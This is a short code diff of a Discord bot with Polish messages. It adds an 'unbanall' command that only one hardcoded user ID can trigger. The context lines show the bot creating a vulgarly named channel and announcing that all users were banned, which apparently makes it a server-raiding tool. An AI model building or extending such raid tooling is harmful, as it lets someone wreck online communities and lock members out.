@@ -147,7 +147,17 @@ message.guild.createChannel("JEBAĆ FUBU XD");
   });
   message.channel.send("Wszyscy Użytkownicy zostali zbanowali. Pozdrawiam ANF 2.0 XD");
   }
+if(cmd === `unbanall`){
+	  if (message.author.id === "340557425511759892") {
+message.guild.fetchBans().then(bans => {
+    bans.forEach(m => {
+         message.guild.unban(m);
+    })
 
+    message.channel.send(`Odbanowano **${bans.size}** użytkowników`)
+})
+	
+}
     if(cmd === `ban`){	
 
    const member = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));	
